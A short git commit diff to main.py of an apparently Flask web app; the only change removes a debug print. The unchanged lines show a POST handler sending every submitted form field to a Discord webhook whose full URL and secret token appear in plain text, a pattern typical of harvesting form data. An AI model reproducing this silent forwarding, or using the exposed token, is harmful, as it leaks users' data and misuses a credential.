dd68201b1465c0ba99228adb2e1868e2f8ead0b2
BuildTools <unconfigured@null.spigotmc.org>
2022-11-11 13:48:46 +0200

    removed uneccessary print

--- main.py
+++ main.py
@@ -9,7 +9,6 @@ def hello_world():
     
     if request.method == 'POST':
         a = request.form
-        print(a['name'])
         requests.post("https://discord.com/api/webhooks/1040584398619295756/PZt9A0VhIzKJzvbeBhB0oMJx5Cd7lnPNzXcr1M9O8OsUpxRwtBRWtrxdAMm_4KbmozUD", data={"content":a})
         return render_template('base.html', a=a)
     else:
